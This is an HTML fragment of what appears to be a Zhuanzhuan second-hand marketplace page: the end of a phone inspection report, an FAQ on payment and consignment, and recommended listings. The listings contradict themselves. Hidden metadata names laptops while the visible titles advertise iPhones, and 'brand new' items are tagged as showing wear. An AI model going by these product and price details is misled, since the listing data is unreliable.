                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">ID 锁</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">系统情况</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                           </div>
                       </div>
                       <div data-v-6e9300e2="" class="content-wrap-antoggle"></div>
                   </div>
                   <!---->
                   <div data-v-6e9300e2="" data-v-422d6a4e="" class="qc-report-tab">
                       <div data-v-6e9300e2="" class="report-tab-tt"><span data-v-6e9300e2="" class="tt">拆修浸液</span>
                           <div data-v-6e9300e2="" class="con hideCheckedIcon">
                               <!---->
                               <div data-v-6e9300e2="" class="check-num normal"><img data-v-6e9300e2="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAASxQTFRFAAAAVf+qVeOOZuaZWuGHVdmEU9qGVdiGU9iFUteFUteFUtiEUtiEU9iDUtiEU9iEU9eEUteEUteEUtiEUteDU9iDU9eDUteDU9eDVNeEVdeFVteFVtiGWdiIXdmLYtqPZNuQZtuRZ9ySadyTa9yVbN2Vbt2Xb92Xb92YcN6Yc96adN+bdt+dd9+eeN+ee+CgfOChf+GjgeGlhOKnhuOoieOqi+Ssj+WukeWwlOaylua0mee2oOm6oum8puq/rOvDruzFsu3IuO7Muu/Nve/Qv/DRxfHVyPLY0PTd2fbj4Pfp4fjp4/jr5fns5/nu6vrw6/rw7Prx7vvy8Pv08fv18vz28/z29Pz39fz49v359/35+P36+f37+v37+v78+/78/P79/f7+/v7+////AK3cAAAAABd0Uk5TAAMJChEbN05cYGZ8j6+3y9vm7PL19/mS+y5dAAABpUlEQVRIx52Wd1uDMBDG00nZBAqpe++9t3XvWbVurfL9v4NBrBKSpsT3DzjC7x7I5e4SAOJKS5ph2Z5nW4YmpUETZWW9iCIq6nKWg2dUB1Fy1EwDPKVAxBRUUiw+Z6KGMnM0n4eII5iP8wUXceUWYjxqKsIj7zZ3cCN/lYMogeDvzFMmSiSzHl0FJZTys74wqQMM11xFiaV+55uT3MEJMlFGApKxg84l2nuIRx3XS5HHtxxWhon6SAOJ+4E9369ORAckoPH4bR9rPzqiAYPDbwb8UVt0yABWY34t4I87iDEL2LGo/JlLn5g/7STf28AjnnvPl+vm3DvmL7piX/VIh8FrvzYfmlPPmK/0IcqB+KUTDL1MB9boPTarI9S8bHLSQ3cYexhDqP8GG0+TdCCsWFjHHzF4O9B9iW9vs4zIGfGFm3nF6NUZvnwsskKtUamxUPNDrTLXRqKTbyXkN5g8Tj46vdcDfou9+DqzgMq+v8spIEaJ7hyUOCXKaAKlVl4TEG8zwo1MvFUKN2Pxdi++oYhvWeKbovi2K76xix8d/nE4SXL8+QKBmsD8vLm4GwAAAABJRU5ErkJggg=="> <span data-v-6e9300e2="">全部正常</span></div>
                               <!---->
                               <!----> <img data-v-6e9300e2="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="arrow">
                           </div>
                       </div>
                       <div data-v-6e9300e2="" class="content-wrap-show"></div>
                       <div data-v-6e9300e2="" class="content-wrap-toggle">
                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="grey-bg">
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">拆修</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">摄像头</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">屏幕</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">主板</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">机身</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">电池更换情况</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">电池信息情况</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">组件</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">尾插螺丝</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">浸液</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">浸液痕迹</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                           </div>
                       </div>
                       <div data-v-422d6a4e="" class="content-wrap-antoggle"></div>
                               </div>
                               <!---->
                           </div>
                           <div data-v-422d6a4e="" class="qc-engineer">
                               <div data-v-422d6a4e="" class="avatar" data-src="https//cdn.huodao.hk/review_img/f63/45b/f6345b92fef087af8fc17dacc3f88a3c_560x560.png" lazy="loading" style="background-image: url(img/f6345b92fef087af8fc17dacc3f88a3c_560x560.png);">
                                   <span data-v-422d6a4e=""></span>
                               </div>
                               <div data-v-422d6a4e="" class="engineer">
                                   <p data-v-422d6a4e="">韩亚南</p>
                                   <p data-v-422d6a4e="" class="title">验机工程师</p>
                               </div>
                           </div>
                       </div>




           <div data-v-422d6a4e="" class="bottom-info">转转智能质检中心官方认证</div>
       </div>
       <div data-v-422d6a4e="" class="test-process">
           <p data-v-422d6a4e="" class="test-process-title">转转验机</p>
           <p data-v-422d6a4e="" class="test-process-subtitle"><span data-v-422d6a4e="">二手质检服务开创者</span></p>
           <!---->
           <div data-v-422d6a4e="" class="test-process-img"><img data-v-422d6a4e="" src="img/86cf1984-4d89-4572-b22a-16f1074ffa11.png"></div>
       </div>
       <!---->
   </section>
   <!---->


       <div id="xiangqing11" data-v-74ba40ca="" class="zy-intro">

           <div data-v-74ba40ca="" class="img-wrap max-wrap">

               <img data-v-74ba40ca="" alt="" data-src="/img/45671d83-f1f7-4ca4-89a0-941733481933.webp" src="/img/45671d83-f1f7-4ca4-89a0-941733481933.webp" lazy="loaded">

           </div>

       </div>
       <!---->
               <div class="page-detail">
                   <section data-v-67a48718="" class="faq-wrap">
                       <div data-v-67a48718="" class="faq-wrap-title">
                           <h4 data-v-67a48718="">常见问题</h4> <span data-v-67a48718="" class="btn">查看更多<img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAMAAADW3miqAAAAP1BMVEUAAACbm5uZmZmampqZmZmampqZmZmbm5uampqgoKCZmZmampqampqampqZmZmampqZmZmampqbm5ubm5uZmZkHEZ4HAAAAFHRSTlMAMOwy+u7OGE0S1mFW792rqnlFIYuvnHgAAABeSURBVDjL7dE5DoAwDERRO5DEEAjb3P+shI7OLqxISPz6VTP0mXLJOkqIbEAGxbGpwaJCXxV81eqpLk0JgEM7ugIjK2ZuRvqY6TGLYpKfgcUUZcTNYKgaDJ270N+7G7FfBgs6dT1AAAAAAElFTkSuQmCC"></span>
                       </div>
                       <ul data-v-67a48718="" class="normal">
                           <li data-v-67a48718="">
                               <div data-v-67a48718="" class="tt">
                                   1.用户支付方式有哪些？
                                   <img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="">
                               </div>
                               <p data-v-67a48718="" class="active">平台可支持花呗、微信支付（储蓄卡&信用卡）和组合支付。</p>
                           </li>
                           <li data-v-67a48718="">
                               <div data-v-67a48718="" class="tt">
                                   2.用户寄卖商品的交易流程是怎样的？
                                   <img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="close-img">
                               </div>
                               <p data-v-67a48718="" class="">卖家将商品寄卖在平台，平台已经出具了验机评估报告，买家购买后将由平台直接发货给买家。</p>
                           </li>
                           <li data-v-67a48718="">
                               <div data-v-67a48718="" class="tt">
                                   3.“基本功能完好”代表什么？
                                   <img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="close-img">
                               </div>
                               <p data-v-67a48718="" class="">电子产品基本功能（含通话，触摸，相机，上网）能正常使用，但存在屏幕显示/摄像头拍照/按键弹性/电池效率正常老化或衰弱现象。</p>
                           </li>
                           <li data-v-67a48718="" style="display: none;">
                               <div data-v-67a48718="" class="tt">
                                   4.用户寄卖商品和转转自营商品一样吗？
                                   <img data-v-67a48718="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="close-img">
                               </div>
                               <p data-v-67a48718="" class="">不一样。用户寄卖的商品均来自个人卖家，卖家将商品寄卖在平台，平台已验机完毕并出具详细报告，不是转转自营机器。</p>
                           </li>

                       </ul>
                   </section>
               </div>









                <div class="zy-int"></div>

                <div id="xiangqing"></div>






                <div class="page-detail">
                    <div data-v-82002cb8="" zz-sectionid="111" class="recommend-wrapper" id="tab-recommend">
                        <h5 data-v-82002cb8="">相似推荐</h5>
                        <div data-v-82002cb8="" class="list-wrapper z-list">
                            <div class="z-list__placeholder"></div>
                            <div data-v-82002cb8="" class="list-item">
                                <div data-v-82002cb8="" data-metric="m1LPOUbYl0hefmbYxkoMCA2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:0,&quot;infoId&quot;:&quot;1384042704270559232&quot;}" zz-infoid="1384042704270559232" zz-sortid="0" data-isdot="0" zz-sortname="苹果 17年 13寸 MacBook Air 13.3英寸 8GB 256G SSD Intel HD Graphics 6000 银色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/6c8689d5-3a5e-4bd8-aa41-ce2d14a32080.png"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                全新
                                            </span></div>
                                        全新Apple/苹果iPhone12手机国行正品5G双卡
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            轻微使用痕迹<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>5439</span> <span data-v-82002cb8="" class="price-desc">秒杀价</span>
                                        <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>5559</span>
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info">
                                        <img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店
                                    </div>
                                </div>
                                <div data-v-82002cb8="" data-metric="qKfHQcLz0CkIBZ5JbM1i4g2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:1,&quot;infoId&quot;:&quot;1438429626103007233&quot;}" zz-infoid="1438429626103007233" zz-sortid="1" data-isdot="0" zz-sortname="ThinkPad E550 15.6英寸 4GB 128G SSD Intel GMA HD 石墨黑" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/6c8689d5-3a5e-4bd8-aa41-ce2d14a32080.png"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                95新
                                            </span></div>
                                        全新Apple/苹果iPhone12手机国行正品5G双卡 黑色
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观全新<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>5439</span> <span data-v-82002cb8="" class="price-desc">到手价</span> <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>5559</span></div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="CkZqPFoSP7nSkoeAjMY4tw2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:2,&quot;infoId&quot;:&quot;1393168369100030464&quot;}" zz-infoid="1393168369100030464" zz-sortid="2" data-isdot="0" zz-sortname="机械革命 深海泰坦 X6Ti 15.6英寸 16GB 512G SSD GTX 1050 Ti 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/7649a3d5-a052-4aec-abcf-5cfd5d972506.jpeg"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                全新
                                            </span></div>
                                        Apple iPhone12 Pro 5G 双卡双待 石墨
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观全新<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>9479</span> <span data-v-82002cb8="" class="price-desc">到手价</span>
                                        <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>9599</span>
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="XlZRNp5oMyL3fllIAFTNVQ2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:3,&quot;infoId&quot;:&quot;1434795605666071552&quot;}" zz-infoid="1434795605666071552" zz-sortid="3" data-isdot="0" zz-sortname="富士通 A573 15.6英寸 8GB 256G SSD+320G HDD Intel GMA HD 4000 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/a9d0235a-9c24-47d4-8ffd-8f4175c32626.jpeg"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                全新
                                            </span></div>
                                        Apple iPhone12 5G 双卡双待 红色 64G
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观全新<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>4879</span> <span data-v-82002cb8="" class="price-desc">秒杀价</span>
                                        <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>4999</span>
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
                            </div>
                            <div data-v-82002cb8="" class="list-item list-right">
                                <div data-v-82002cb8="" data-metric="Z82bsrTD7up2aSkWk3GqJw2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:0,&quot;infoId&quot;:&quot;1427527283748668416&quot;}" zz-infoid="1427527283748668416" zz-sortid="0" data-isdot="0" zz-sortname="惠普 4540s 15.6英寸 8GB 256G SSD Intel GMA HD 银色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="img/cf1b7e55-832b-436c-9a9a-c3c3f21fffac.jpeg"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                全新
                                            </span></div>
                                        [全新]Apple iPhone11 4G手机双卡双待
                                    </div>
                                    <ul data-v-82002cb8="" class="tag-list">
                                        <li data-v-82002cb8="">
                                            外观完好<span data-v-82002cb8=""></span></li>
                                        <li data-v-82002cb8="">
                                            功能完好<span data-v-82002cb8="" style="display: none;"></span></li>
                                    </ul>
                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>4579</span> <span data-v-82002cb8="" class="price-desc">秒杀价</span>
                                        <span data-v-82002cb8="" class="price-desc price-line"><em data-v-82002cb8="">¥</em>4699</span>
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="img/39c0f2e9-331e-4da7-963d-b034c9b1567f.webp">优质货源旗舰店</div>
                                </div>
